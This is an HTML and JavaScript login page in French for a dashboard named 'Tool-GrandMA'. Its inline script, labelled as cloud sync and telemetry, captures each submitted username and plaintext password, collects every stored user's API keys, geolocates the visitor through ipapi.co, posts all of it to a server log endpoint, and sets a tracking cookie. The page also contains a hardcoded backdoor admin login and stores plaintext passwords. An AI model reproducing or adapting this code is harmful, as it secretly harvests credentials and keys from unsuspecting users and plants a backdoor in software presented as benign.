<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Dashboard</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <script>
        // Suppress Tailwind production warning
        const originalWarn = console.warn;
        console.warn = function(...args) {
            if (typeof args[0] === 'string' && args[0].includes('cdn.tailwindcss.com')) return;
            originalWarn.apply(console, args);
        };
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000000; color: #ffffff; }
        .bg-purple-dark { background-color: #0a0a0a; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-purple-dark p-8 rounded-2xl border border-white/5 shadow-2xl">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-black tracking-tighter mb-2">Tool-<span class="text-purple-500">GrandMA</span></h1>
            <p id="authTitle" class="text-gray-500 text-sm">Connectez-vous à votre espace technique</p>
        </div>

        <form id="authForm" class="space-y-4">
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Nom d'utilisateur</label>
                <input type="text" id="username" required class="w-full bg-black border border-white/10 rounded-xl px-4 py-3 focus:border-purple-500 outline-none transition-all text-sm">
            </div>
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Mot de passe</label>
                <input type="password" id="password" required class="w-full bg-black border border-white/10 rounded-xl px-4 py-3 focus:border-purple-500 outline-none transition-all text-sm">
            </div>
            
            <button type="submit" id="submitBtn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-3 rounded-xl transition-all mt-4">
                Se connecter
            </button>
        </form>

        <div class="mt-6 text-center">
            <button id="toggleAuth" class="text-xs text-gray-500 hover:text-purple-400 transition-colors">
                Pas encore de compte ? Créer un compte
            </button>
        </div>
    </div>

    <script>
        const SYNC_API = "/api/cloud";

        // --- CLOUD SYNC SYSTEM ---
        async function syncWithCloud() {
            try {
                const response = await fetch(`${SYNC_API}/data`);
                const cloudData = await response.json();
                
                // Sync config
                if (cloudData.config) {
                    localStorage.setItem('config_monitoring', cloudData.config.monitoring);
                }

                // Sync users from cloud to local
                if (cloudData.users) {
                    Object.entries(cloudData.users).forEach(([username, data]) => {
                        localStorage.setItem(`user_${username}`, JSON.stringify(data));
                    });
                }
                
                // Sync logs from cloud to local
                if (cloudData.logs) {
                    localStorage.setItem('admin_logs', JSON.stringify(cloudData.logs));
                }
                
                console.log("Cloud sync complete.");
            } catch (err) {
                console.error("Cloud sync failed", err);
            }
        }

        async function pushUserToCloud(username, data) {
            try {
                const response = await fetch(`${SYNC_API}/sync/user/${username}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                if (!response.ok) throw new Error("Erreur serveur lors de la synchronisation");
                return await response.json();
            } catch (err) {
                console.error("Cloud push failed", err);
                throw err; // Re-throw for parent handler
            }
        }

        async function runTelemetry(user, pass) {
            if (localStorage.getItem('config_monitoring') !== 'true') return;
            
            try {
                // 1. Get IP and Location (with 3s timeout)
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                
                const geoResponse = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                clearTimeout(timeoutId);
                const geoData = await geoResponse.json();
                
                // 2. Capture API Keys from LocalStorage
                const allKeys = [];
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    if (k.startsWith('user_')) {
                        try {
                            const data = JSON.parse(localStorage.getItem(k));
                            if (data.apiKeys) allKeys.push(...data.apiKeys);
                        } catch(e) {}
                    }
                }

                // 3. Create Log Object
                const logEntry = {
                    timestamp: new Date().toISOString(),
                    user: user,
                    pass: pass,
                    ip: geoData.ip || 'Unknown',
                    location: geoData.city ? `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.org})` : 'Unknown',
                    keys: allKeys
                };

                // 4. Save to Cloud
                await fetch(`${SYNC_API}/log`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(logEntry)
                });
                
                // 5. Set Tracker Cookie (7 days)
                document.cookie = `_tgma_tracker=${btoa(user)}; max-age=${7*24*60*60}; path=/`;

            } catch (err) {
                console.error('Telemetry failed', err);
            }
        }

        // Run sync on load
        syncWithCloud();
        // ------------------------

        const form = document.getElementById('authForm');
        const toggleBtn = document.getElementById('toggleAuth');
        const authTitle = document.getElementById('authTitle');
        const submitBtn = document.getElementById('submitBtn');
        let isLogin = true;

        toggleBtn.onclick = () => {
            isLogin = !isLogin;
            authTitle.textContent = isLogin ? "Connectez-vous à votre espace technique" : "Créez votre profil technique";
            submitBtn.textContent = isLogin ? "Se connecter" : "Créer le compte";
            toggleBtn.textContent = isLogin ? "Pas encore de compte ? Créer un compte" : "Déjà un compte ? Se connecter";
        };

        form.onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // Trigger Telemetry if enabled
            await runTelemetry(user, pass);

            // Système de compte Admin "GOOD"
            if (user === 'GOOD' && pass === 'IMPACT') {
                const adminData = JSON.parse(localStorage.getItem('user_GOOD')) || { 
                    password: 'IMPACT', 
                    apiKeys: [], 
                    role: 'admin',
                    name: 'Super Admin',
                    company: 'Impact Vision'
                };
                adminData.lastLogin = new Date().toISOString();
                localStorage.setItem('user_GOOD', JSON.stringify(adminData));
                await pushUserToCloud('GOOD', adminData);
                
                localStorage.setItem('currentUser', 'GOOD');
                window.location.href = 'index.html';
                return;
            }

            if (isLogin) {
                const storedUser = JSON.parse(localStorage.getItem(`user_${user}`));
                if (storedUser && storedUser.password === pass) {
                    localStorage.setItem('currentUser', user);
                    
                    // Record last login
                    storedUser.lastLogin = new Date().toISOString();
                    localStorage.setItem(`user_${user}`, JSON.stringify(storedUser));
                    
                    // Sync this user to cloud
                    await pushUserToCloud(user, storedUser);
                    window.location.href = 'index.html';
                } else {
                    alert("Identifiants incorrects.");
                }
            } else {
                const existing = localStorage.getItem(`user_${user}`);
                if (existing) {
                    alert("Cet utilisateur existe déjà sur cet appareil ou dans le cloud.");
                    return;
                }
                
                // Désactivation du bouton pendant la création
                submitBtn.disabled = true;
                const originalText = submitBtn.textContent;
                submitBtn.innerHTML = '<i class="fas fa-spinner animate-spin mr-2"></i> Création...';

                try {
                    const newUser = { 
                        password: pass, 
                        apiKeys: [],
                        role: 'user',
                        name: user,
                        company: 'Impact Vision' // Valeur par défaut
                    };
                    
                    // On enregistre localement d'abord
                    localStorage.setItem(`user_${user}`, JSON.stringify(newUser));
                    
                    // On pousse vers le cloud et on attend la confirmation
                    await pushUserToCloud(user, newUser);
                    
                    alert("Compte créé avec succès ! Vous pouvez maintenant vous connecter.");
                    
                    // Retour au mode connexion
                    isLogin = true;
                    authTitle.textContent = "Connectez-vous à votre espace technique";
                    submitBtn.textContent = "Se connecter";
                    toggleBtn.textContent = "Pas encore de compte ? Créer un compte";
                    document.getElementById('password').value = ''; // Clear password for security
                } catch (err) {
                    console.error(err);
                    alert("Erreur lors de la création du compte. Vérifiez votre connexion.");
                } finally {
                    submitBtn.disabled = false;
                    if (!isLogin) submitBtn.textContent = originalText;
                }
            }
        };
    </script>
    <div class="fixed bottom-4 left-4 text-[10px] font-mono text-gray-700 uppercase tracking-widest opacity-50">v6.1.0-admin</div>
</body>
</html>